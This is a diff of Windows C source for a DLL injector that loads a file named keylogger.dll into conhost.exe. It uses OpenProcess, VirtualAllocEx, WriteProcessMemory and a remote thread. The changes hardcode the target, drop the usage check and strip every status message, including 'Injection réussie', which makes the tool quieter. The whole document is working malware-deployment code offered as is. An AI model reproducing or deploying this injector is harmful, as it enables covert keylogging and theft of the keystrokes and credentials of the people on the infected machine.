@@ -31,43 +31,30 @@ DWORD FindTargetPID(const wchar_t* targetName)
 	return 0;
 }
 
-int wmain(int argc, wchar_t* argv[])
+int wmain(void)
 {
-	if (argc != 2)
-	{
-		wprintf(L"Usage: %s <process.exe>\n", argv[0]);
-		return 1;
-	}
 	const wchar_t* dllPath = L"C:\\Users\\Celeste\\Documents\\tinkyWinkey\\keylogger.dll";
-	const wchar_t* targetProcess = argv[1];
+	const wchar_t* targetProcess = L"conhost.exe";
 
 	DWORD pid = FindTargetPID(targetProcess);
 	if (pid == 0)
-	{
-		wprintf(L"Processus cible non trouvé.\n");
 		return 1;
-	}
-
+		
 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 	if (!hProcess)
-	{
-		wprintf(L"Impossible d'ouvrir le processus.\n");
 		return 1;
-	}
 
 	size_t dllPathSize = (wcslen(dllPath) + 1) * sizeof(wchar_t);
 
 	LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (!remoteMem)
 	{
-		wprintf(L"Échec de l'allocation mémoire distante.\n");
 		CloseHandle(hProcess);
 		return 1;
 	}
 
 	if (!WriteProcessMemory(hProcess, remoteMem, (LPVOID)dllPath, dllPathSize, NULL))
 	{
-		wprintf(L"Échec de l'écriture mémoire distante.\n");
 		VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
 		CloseHandle(hProcess);
 		return 1;
@@ -78,7 +65,6 @@ int wmain(int argc, wchar_t* argv[])
 
 	if (!hThread)
 	{
-		wprintf(L"Échec de la création du thread distant.\n");
 		VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
 		CloseHandle(hProcess);
 		return 1;
@@ -88,6 +74,5 @@ int wmain(int argc, wchar_t* argv[])
 	CloseHandle(hThread);
 	CloseHandle(hProcess);
 
-	wprintf(L"Injection réussie.\n");
 	return 0;
 }
